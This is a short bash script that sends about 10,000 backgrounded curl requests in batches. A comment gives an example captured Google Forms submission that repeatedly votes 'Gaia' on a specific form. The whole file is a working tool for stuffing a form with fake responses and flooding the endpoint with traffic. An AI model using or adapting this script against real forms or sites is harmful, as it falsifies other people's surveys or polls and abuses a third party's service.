CURLURL=""

for i in {1..100}
do
for j in {1..100};
do curl $CURLURL --compressed &> /dev/null & disown;
done;
echo 'sent request number ' $i;
sleep 3;
done

#An example of what the cURL should look like
#CURLURL="'https://docs.google.com/forms/d/1iW8Ek207g1bhk2P_3s2J5oifwjOEpGkd2ytaXn2NYDI/formResponse' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Referer: https://docs.google.com/forms/d/1iW8Ek207g1bhk2P_3s2J5oifwjOEpGkd2ytaXn2NYDI/viewform?c=0&w=1&fbzx=1358470302835339248' -H 'Origin: https://docs.google.com' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' --data 'entry.737624720=Gaia&draftResponse=%5B%2C%2C%221358470302835339248%22%5D%0D%0A&pageHistory=0&fbzx=1358470302835339248'"